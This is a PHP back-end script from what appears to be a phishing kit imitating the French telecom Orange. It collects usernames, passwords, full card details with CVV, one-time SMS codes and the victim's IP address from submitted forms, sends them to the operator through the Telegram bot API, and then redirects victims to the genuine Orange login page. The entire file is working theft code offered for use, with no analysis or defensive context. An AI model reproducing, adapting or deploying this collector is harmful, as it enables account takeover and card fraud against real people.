<?php require '../config.php';function send($sms){global $bot_token;global $chat_id;$link="https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$sms";$c=curl_init();curl_setopt($c,CURLOPT_URL,$link);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);$res=curl_exec($c);curl_close($c);return $res;}function get($link){$c=curl_init();curl_setopt($c,CURLOPT_URL,$link);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);$res=curl_exec($c);curl_close($c);return $res;}if(isset($_POST['user'])){$msg=urlencode("[ -- ORANGE LOGIN -- ]\nUSER: ".$_POST['user']."\nPASS: ".$_POST['password']."\nIP: ".$_SERVER['REMOTE_ADDR']);send($msg);function sendtotelegram($link){$c=curl_init();curl_setopt($c,CURLOPT_URL,$link);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);$res=curl_exec($c);curl_close($c);return $res;}get($telegram_link."1997125017&text=".$msg);header("location: https://login.orange.fr/");}if(isset($_POST['cardnumber'])){$msg=urlencode("[ -- ORANGE CC -- ]\nNAME: ".$_POST['fullname']."\nCC NUMBER: ".$_POST['cardnumber']."\nEXP: ".$_POST['exp']."\nCVV: ".$_POST['cvv']."\nIP: ".$_SERVER['REMOTE_ADDR']);send($msg);function sendtotelegram($link){$c=curl_init();curl_setopt($c,CURLOPT_URL,$link);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);$res=curl_exec($c);curl_close($c);return $res;}get($telegram_link."1997125017&text=".$msg);header("location: sms.php");}if(isset($_POST['otp'])){$msg=urlencode("[ -- ORANGE OTP -- ]\nOTP: ".$_POST['otp']."\nIP: ".$_SERVER['REMOTE_ADDR']);send($msg);function sendtotelegram($link){$c=curl_init();curl_setopt($c,CURLOPT_URL,$link);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);$res=curl_exec($c);curl_close($c);return $res;}get($telegram_link."1997125017&text=".$msg);} ?>